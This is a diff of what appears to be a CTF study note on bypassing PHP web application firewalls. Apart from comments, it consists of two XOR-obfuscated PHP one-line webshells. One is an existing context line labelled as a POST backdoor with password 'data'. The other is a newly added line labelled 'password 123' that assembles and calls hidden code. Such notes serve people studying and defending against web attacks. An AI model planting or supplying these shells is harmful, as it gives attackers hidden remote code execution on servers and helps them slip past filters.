@@ -10,6 +10,9 @@
   # ↓ 真·一句话 POST  密码data
   ('([([@@'^'["[/%-')(${'"-/(/'^'}}`{{'}['@^^^'^'$?*?']);
   
+  # 密码123
+  <?php $a='666666666666966'^'UDSWBSiPCXUBPYX';$a('',('L111TLL111811118TPG8LLLLT1LTT1G118TT'^'1TGP8dhnctidtbecebteewcctS5t9P5GTVee'));?>
+  
   ```
 - 构建技巧： [[CTFWEB/PHP/WAF绕过]]
 -
